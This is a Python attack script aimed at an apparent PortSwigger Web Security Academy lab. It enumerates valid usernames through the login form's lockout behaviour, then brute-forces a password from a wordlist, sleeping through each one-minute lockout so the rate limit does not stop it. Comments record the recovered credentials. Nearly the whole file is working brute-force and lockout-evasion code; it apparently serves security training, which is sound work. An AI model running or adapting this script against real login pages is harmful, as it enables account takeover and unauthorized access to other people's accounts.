import requests
import time

DOMAIN = "0a77007603220aae8093f9e800f00096.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Referer": f"https://{DOMAIN}/login",
    "Cookie": "session=8WBkU7IPFOqupN7pPILYVyt6mYBmE4cA",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "TE": "trailers",
}

with open("../usernames.dic") as f:
    USERNAMES_DIC = f.readlines()

with open("../passwords.dic") as f:
    PASSWORDS_DIC = f.readlines()

def login(username, password):
    url = f"https://{DOMAIN}/login"
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(url, headers=HEADERS, data=data)
    return response

def enum_usernames():
    for username in USERNAMES_DIC:
        username = username.strip()
        for _ in range(7):
            response = login(username, "password")

            if "Invalid username or password." not in response.text:
                print(response.text)
                print(f"Username: {username}")
            
def brute_force_password(username):
    for password in PASSWORDS_DIC:
        password = password.strip()
        response = login(username, password)

            
        if "Invalid username or password." not in response.text and "You have made too many incorrect login attempts. Please try again in 1 minute(s)." not in response.text:
            print(response.text)
            print(f"Username: {username}")
            print(f"Password: {password}")

        if "You have made too many incorrect login attempts. Please try again in 1 minute(s)." in response.text:
            print("Blocked for 1 minute")
            print(f"Current password: {password}")
            time.sleep(60)

# enum_usernames() # guest
brute_force_password("guest") # 12345

